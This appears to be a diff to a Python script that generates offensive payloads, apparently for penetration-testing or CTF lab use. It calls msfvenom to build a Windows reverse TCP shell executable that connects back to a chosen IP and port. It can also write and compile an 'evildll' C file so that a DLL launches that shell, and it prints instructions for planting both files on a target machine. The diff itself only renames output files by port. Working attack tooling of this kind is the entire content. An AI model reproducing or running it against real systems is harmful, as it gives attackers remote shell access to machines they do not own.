@@ -8,9 +8,6 @@ import re
 import time
 
 DLL_CODE_FILE_NAME = "evildll.c"
-DLL_COMPILED_FILE_NAME = "evildll.dll"
-EXE_FILE_NAME = "reverse.exe"
-DLL_COMPILE_COMMAND = f"x86_64-w64-mingw32-gcc {DLL_CODE_FILE_NAME} --shared -o {DLL_COMPILED_FILE_NAME}"
 
 DLL_CODE_TEMPLATE = """
 #include <stdlib.h>
@@ -65,6 +62,10 @@ def main():
     port = args.port if args.port else 443
     ip = args.ip if args.ip else get_tun0_ip()
 
+    exe_file_name = f"reverse-{port}.exe"
+    dll_compiled_file_name = f"evildll-{port}.dll"
+    dll_compile_command = f"x86_64-w64-mingw32-gcc {DLL_CODE_FILE_NAME} --shared -o {dll_compiled_file_name}"
+
     if not ip:
         print(f"Error: Could not get IP address for tun0 interface. Please specify an IP address manually.")
         sys.exit(1)
@@ -82,7 +83,7 @@ def main():
     print(f"Switching to directory: {directory}")
 
     # generate a reverse shell payload using msfvenom
-    msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > {EXE_FILE_NAME}"
+    msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > {exe_file_name}"
     print(f"Generating payload using msfvenom:\n\t{msfvenom_command}")
     payload = subprocess.check_output(msfvenom_command, shell=True).decode()
     print(payload)
@@ -94,37 +95,37 @@ def main():
             args.dll = args.dll + "\\"
 
         # add the exe file name to the dll target path
-        args.dll = args.dll + EXE_FILE_NAME
+        args.dll = args.dll + exe_file_name
 
         # escape the target path for the DLL code template
         target_path = args.dll.replace("\\", "\\\\")
 
         # replace #REVERSE_EXE_PATH# in the DLL code template with the given target path
-        print(f"Generating DLL code that will execute the reverse.exe at path {args.dll}")
+        print(f"Generating DLL code that will execute the {exe_file_name} at path {args.dll}")
         dll_code = DLL_CODE_TEMPLATE.replace("#REVERSE_EXE_PATH#", target_path)
         with(open(DLL_CODE_FILE_NAME, "w")) as f:
             f.write(dll_code)
         print(f"DLL code written to {DLL_CODE_FILE_NAME}")
 
         # compile the DLL
-        print(f"Compiling DLL code...\n\t{DLL_COMPILE_COMMAND}")
-        result = subprocess.run(DLL_COMPILE_COMMAND, shell=True, capture_output=True)
+        print(f"Compiling DLL code...\n\t{dll_compile_command}")
+        result = subprocess.run(dll_compile_command, shell=True, capture_output=True)
         # check return code
         if result.returncode != 0:
             print(f"Error compiling DLL: {result.stderr.decode()}")
             sys.exit(1)
-        print(f"DLL compiled to {DLL_COMPILED_FILE_NAME}")
+        print(f"DLL compiled to {dll_compiled_file_name}")
 
     print(f"\nDone.")
     print(f"Generated files:")
-    print(f"  - {os.path.join(directory, EXE_FILE_NAME)}")
+    print(f"  - {os.path.join(directory, exe_file_name)}")
     if (args.dll):
         print(f"  - {os.path.join(directory, DLL_CODE_FILE_NAME)}")
-        print(f"  - {os.path.join(directory, DLL_COMPILED_FILE_NAME)}")
-        print(f"\nUpload {EXE_FILE_NAME} to the target machine and place it at {args.dll}.")
-        print(f"Upload {DLL_COMPILED_FILE_NAME} to the target machine and use it so that it runs.")
+        print(f"  - {os.path.join(directory, dll_compiled_file_name)}")
+        print(f"\nUpload {exe_file_name} to the target machine and place it at {args.dll}.")
+        print(f"Upload {dll_compiled_file_name} to the target machine and use it so that it runs.")
     else:
-        print(f"\nUpload {EXE_FILE_NAME} to the target machine and use it so that it runs.")
+        print(f"\nUpload {exe_file_name} to the target machine and use it so that it runs.")
 
 if __name__ == "__main__":
     main()
